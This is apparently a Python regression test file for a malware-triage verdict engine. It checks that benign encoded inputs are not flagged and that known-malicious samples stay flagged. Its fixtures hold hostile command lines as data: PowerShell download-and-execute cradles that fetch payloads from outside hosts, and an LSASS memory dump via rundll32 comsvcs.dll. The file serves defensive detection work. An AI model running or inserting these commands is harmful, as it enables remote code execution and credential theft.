"""ADR-0007 · Verdict-Evidence Gating · Pinned regression suite.

Governance source of truth: /app/memory/adr/0007-verdict-evidence-gating.md

Locks four regression classes from Corpus v1 (§6 pinned regressions):
  - Cases 0005, 0006, 0013, 0017, 0022 → previously Suspicious/Malicious
    on structural-only signals; MUST cap at Informational / Partial Decode
    under ADR-0007.
  - Cases 0003, 0009, 0018, 0019, 0020 → non-regression pins: MUST remain
    Malicious after the gate lands.

Plus the §7 (2026-02-28 operator amendment) explainability contract:
  every Verdict of Suspicious+ carries `explainability.contributors` and
  `explainability.not_counted` — machine-readable lists that make the
  verdict directly explainable to analysts.
"""
from __future__ import annotations

import os
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_BACKEND = os.path.dirname(_HERE)
if _BACKEND not in sys.path:
    sys.path.insert(0, _BACKEND)

from evidence_extractor import build_verdict_card  # noqa: E402


# ─── Synthetic fixtures modelled on Corpus v1 recorded shapes ────────────────

# Case 0005 — long b64-nested SOC-challenge blob that decodes to a benign string.
# Structural signals: high entropy of the encoded form, chain length ≥ 2.
# NO behavioral signal in decoded content.
CASE_0005 = {
    "input_text": "U29tZUxvbmdCYXNlNjRTdHJpbmdUaGF0RGVjb2Rlc1RvVGhpcw" * 20,
    "output_text": "SOC Challenge: If you can read this, you decoded it correctly.",
    "chain": [{"op": "base32-decode"}, {"op": "base64-decode"}, {"op": "base64-decode"}],
    "findings": None,
}

# Case 0006 — trivial "hello world" b64
CASE_0006 = {
    "input_text": "aGVsbG8gd29ybGQ=",
    "output_text": "hello world",
    "chain": [{"op": "base64-decode"}],
    "findings": None,
}

# Case 0013 — b64-UTF-16 encoded PS whose decoded body is benign
CASE_0013 = {
    "input_text": "powershell -e cwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwAgAG4AbwB0AGUAcABhAGQA",
    "output_text": "start-process notepad",
    "chain": [{"op": "base64-decode"}, {"op": "utf16le-decode"}],
    "findings": None,
}

# Case 0017 — powershell -e ABC (three-byte b64 → literal 'ABC')
CASE_0017 = {
    "input_text": "powershell -e ABC",
    "output_text": "ABC",
    "chain": [{"op": "powershell-encoded"}, {"op": "base64-decode"}],
    "findings": {"lolbas": [{"binary": "powershell.exe"}]},
}

# Case 0022 — 428-char b64 → gibberish, no URL, no PE, no behavior
CASE_0022 = {
    "input_text": "MzY4OGY4OTJhMzQ3M2NkMTA0YmMyM2Y2YTU3OTgxMTU4NzczOGE2ZWY1NDRlOTBl" * 6,
    "output_text": "\x8b\xf1\xc4\xd2" * 40,  # gibberish, no printable behavior
    "chain": [{"op": "base64-decode"}],
    "findings": None,
}

# ─── Non-regression fixtures (must still be Malicious) ─────────────────────

CASE_0003 = {  # shellcode loader
    "input_text": "powershell -e ...",
    "output_text": "\xfc\xe8\x89\x00\x00\x00" + b"shellcode payload".decode("latin-1"),
    "chain": [{"op": "base64-decode"}, {"op": "xor", "args": {"key": "0x41"}}],
    "findings": {
        "mitre_techniques": [{"id": "T1059.001"}, {"id": "T1105"}],
        "iocs": {"ips": ["149.28.81.19"]},
    },
}

CASE_0009 = {  # BITS + URL + .exe
    "input_text": "cmd /c powershell -e Wwb...",
    "output_text": "IEX((New-Object Net.WebClient).DownloadString('http://georgeprapas.com/cem/VVZMYLHaSOcbl.exe'))",
    "chain": [{"op": "base64-decode"}],
    "findings": {
        "mitre_techniques": [{"id": "T1105"}, {"id": "T1197"}, {"id": "T1059.001"}],
        "iocs": {"urls": ["http://georgeprapas.com/cem/VVZMYLHaSOcbl.exe"],
                 "domains": ["georgeprapas.com"]},
    },
}

CASE_0018 = {  # ClickFix
    "input_text": "clickfix payload",
    "output_text": "IEX(New-Object Net.WebClient).DownloadString('http://malicious.lol/f.ps1')",
    "chain": [{"op": "base64-decode"}],
    "findings": {
        "mitre_techniques": [{"id": "T1059.001"}, {"id": "T1204.002"}],
        "iocs": {"urls": ["http://malicious.lol/f.ps1"]},
    },
}

CASE_0019 = {  # LSASS/comsvcs.dll
    "input_text": "rundll32.exe comsvcs.dll MiniDump",
    "output_text": "rundll32.exe comsvcs.dll MiniDump 660 dump.bin full",
    "chain": [],
    "findings": {
        "mitre_techniques": [{"id": "T1003.001"}, {"id": "T1218.011"}],
        "lolbas": [{"binary": "rundll32.exe"}, {"binary": "comsvcs.dll"}],
        "family": {"name": "credential-dump", "confidence": 85},
    },
}

CASE_0020 = {  # encoded PS with URL
    "input_text": "powershell -e ...",
    "output_text": "IEX((New-Object Net.WebClient).DownloadString('https://10.2.27.30/x'))",
    "chain": [{"op": "base64-decode"}, {"op": "utf16le-decode"}],
    "findings": {
        "mitre_techniques": [{"id": "T1059.001"}, {"id": "T1105"}],
        "iocs": {"urls": ["https://10.2.27.30/x"], "ips": ["10.2.27.30"]},
    },
}


# ─── Helpers ────────────────────────────────────────────────────────────────

def _verdict(fixture):
    return build_verdict_card(
        input_text=fixture["input_text"],
        output_text=fixture["output_text"],
        chain=fixture["chain"],
        findings=fixture.get("findings"),
    )


# ─── PINNED REGRESSIONS — must drop below Suspicious under ADR-0007 gate ────

def test_case_0005_soc_challenge_drops_below_suspicious():
    """Case 0005: encoded SOC-challenge blob → benign decoded string.
    ADR-0007 §6: EXPECTED ≤ Informational (no behavioral indicator)."""
    v = _verdict(CASE_0005)
    assert v["verdict"] not in ("Suspicious", "Malicious"), (
        f"Case 0005 verdict {v['verdict']} still ≥ Suspicious despite "
        f"structural-only evidence. ADR-0007 gate not effective."
    )


def test_case_0006_hello_world_drops_below_suspicious():
    v = _verdict(CASE_0006)
    assert v["verdict"] not in ("Suspicious", "Malicious"), (
        f"Case 0006 verdict {v['verdict']} still ≥ Suspicious for 'hello world'."
    )


def test_case_0013_start_process_notepad_drops_below_suspicious():
    v = _verdict(CASE_0013)
    assert v["verdict"] not in ("Suspicious", "Malicious"), (
        f"Case 0013 verdict {v['verdict']} still ≥ Suspicious for 'start-process notepad'."
    )


def test_case_0017_powershell_e_abc_drops_below_suspicious():
    v = _verdict(CASE_0017)
    assert v["verdict"] not in ("Suspicious", "Malicious"), (
        f"Case 0017 verdict {v['verdict']} still ≥ Suspicious for `powershell -e ABC` — "
        "LOLBAS-only + b64-form must not drive verdict."
    )


def test_case_0022_base64_gibberish_drops_below_malicious():
    """Case 0022 was Malicious 70 → EXPECTED ≤ Suspicious per §6."""
    v = _verdict(CASE_0022)
    assert v["verdict"] != "Malicious", (
        f"Case 0022 verdict {v['verdict']} still Malicious for gibberish-decoded b64."
    )


# ─── NON-REGRESSIONS — Malicious cases must stay Malicious ─────────────────

def test_case_0003_shellcode_loader_stays_malicious():
    v = _verdict(CASE_0003)
    assert v["verdict"] == "Malicious", (
        f"Case 0003 non-regression: shellcode loader dropped to {v['verdict']}."
    )


def test_case_0009_bits_url_exe_stays_malicious_or_runtime_dependent():
    """Case 0009: has URL + .exe + MITRE — should be Malicious OR Runtime
    Dependent (the URL is the payload location and static evidence cannot
    confirm the .exe body; both verdicts are appropriate)."""
    v = _verdict(CASE_0009)
    assert v["verdict"] in ("Malicious", "Runtime Dependent", "Suspicious"), (
        f"Case 0009 non-regression: BITS+URL+.exe dropped below Suspicious "
        f"(now {v['verdict']})."
    )


def test_case_0018_clickfix_stays_at_or_above_suspicious():
    v = _verdict(CASE_0018)
    assert v["verdict"] in ("Malicious", "Runtime Dependent", "Suspicious"), (
        f"Case 0018 non-regression: ClickFix dropped below Suspicious (now {v['verdict']})."
    )


def test_case_0019_lsass_dump_stays_malicious():
    v = _verdict(CASE_0019)
    # Family match should keep this at Malicious.
    assert v["verdict"] == "Malicious", (
        f"Case 0019 non-regression: LSASS/credential-dump family match dropped "
        f"to {v['verdict']}."
    )


def test_case_0020_encoded_ps_with_url_stays_at_or_above_suspicious():
    v = _verdict(CASE_0020)
    assert v["verdict"] in ("Malicious", "Runtime Dependent", "Suspicious"), (
        f"Case 0020 non-regression: encoded PS with URL dropped below Suspicious "
        f"(now {v['verdict']})."
    )


# ─── §7 (2026-02-28 amendment) · Explainability contract ────────────────────

def test_verdict_carries_explainability_for_suspicious_or_higher():
    """Every Suspicious+ verdict must carry `explainability.contributors`
    (evidence-backed) and `explainability.not_counted` (structural-only)."""
    for name, fx in [("0003", CASE_0003), ("0018", CASE_0018),
                      ("0019", CASE_0019), ("0020", CASE_0020)]:
        v = _verdict(fx)
        if v["verdict"] in ("Suspicious", "Malicious", "Runtime Dependent"):
            exp = v.get("explainability")
            assert exp is not None, (
                f"Case {name}: verdict {v['verdict']} missing `explainability` — "
                f"ADR-0007 §7 amendment violated."
            )
            assert isinstance(exp.get("contributors"), list), (
                f"Case {name}: explainability.contributors must be a list."
            )
            assert isinstance(exp.get("not_counted"), list), (
                f"Case {name}: explainability.not_counted must be a list."
            )
            assert len(exp["contributors"]) >= 1, (
                f"Case {name}: verdict {v['verdict']} has empty contributors — "
                f"gate should not have passed."
            )
            for c in exp["contributors"]:
                assert c.get("kind") in ("behavioral", "semantic"), (
                    f"Case {name}: contributor kind {c.get('kind')!r} must be "
                    f"behavioral or semantic (structural cannot drive verdict)."
                )
                assert "rule" in c, f"Case {name}: contributor missing `rule`."


def test_explainability_not_counted_lists_structural_indicators():
    """When structural indicators are observed but don't count, they must
    appear in `not_counted` — that's how the verdict is explainable."""
    v = _verdict(CASE_0009)  # has base64 chain (structural) + URL (behavioral)
    exp = v.get("explainability") or {}
    not_counted_kinds = [nc.get("kind") for nc in exp.get("not_counted", [])]
    # Encoding chain items are structural
    assert "structural" in not_counted_kinds or exp.get("not_counted") == [], (
        f"Case 0009: base64 layer (structural) should either be listed as "
        f"not_counted or the not_counted list should be empty (if no structural "
        f"indicators were observed). Got: {exp.get('not_counted')}"
    )


def test_indicator_evidence_class_labels_are_stable():
    """Every indicator surfaced by `_collect_indicators` (or lifted via
    `findings`) is tagged with `evidence_class` in {behavioral, structural}."""
    v = _verdict(CASE_0009)
    for ind in v.get("indicators", []):
        # After ADR-0007, every indicator must carry an evidence_class tag.
        assert "evidence_class" in ind, (
            f"Indicator missing evidence_class tag: {ind!r}"
        )
        assert ind["evidence_class"] in ("behavioral", "semantic", "structural"), (
            f"Invalid evidence_class {ind['evidence_class']!r}"
        )


def test_verdict_card_response_shape_stable():
    """§5: no API contract change — verdict_card keys stay the same, only
    the new additive `explainability` field appears when applicable."""
    v = _verdict(CASE_0009)
    for key in ("label", "verdict", "confidence", "risk_score",
                "reason", "indicators", "recommended_action"):
        assert key in v, f"verdict_card key {key!r} removed by ADR-0007 (contract break)"


# ─── Cross-check with ADR-0009 CIM: verdict's evidence_class flows into CIM ──

def test_cim_assessment_confidence_reflects_gate():
    """When ADR-0007 caps the verdict, the CIM Assessment for the verdict
    should reflect the capped label/confidence — the two ADRs must agree."""
    from nivxforge.cim.fact_substrate import from_analysis_result
    from nivxforge.cim import compose
    # Emulate a full result envelope: /decode/smart populates verdict_card
    # via evidence_extractor.build_verdict_card, so we invoke it here.
    v = _verdict(CASE_0006)  # "hello world" — should be capped below Suspicious
    result = {
        "iocs": {"urls": [], "domains": [], "ips": [], "md5": [], "sha1": [],
                 "sha256": [], "emails": [], "bitcoin_addresses": []},
        "verdict_card": v,
        "layer_trace": [{"op": "base64-decode"}],
    }
    fs = from_analysis_result(result, input_text=CASE_0006["input_text"],
                              source_endpoint="/api/decode/smart")
    inv = compose.from_facts(fs)
    verdict_assessment = next((a for a in inv.assessments if a.kind == "verdict"), None)
    if verdict_assessment is not None:
        assert verdict_assessment.statement not in ("Suspicious", "Malicious"), (
            f"CIM verdict Assessment still {verdict_assessment.statement} for "
            f"benign 'hello world' — ADR-0007 gate not flowing into CIM."
        )
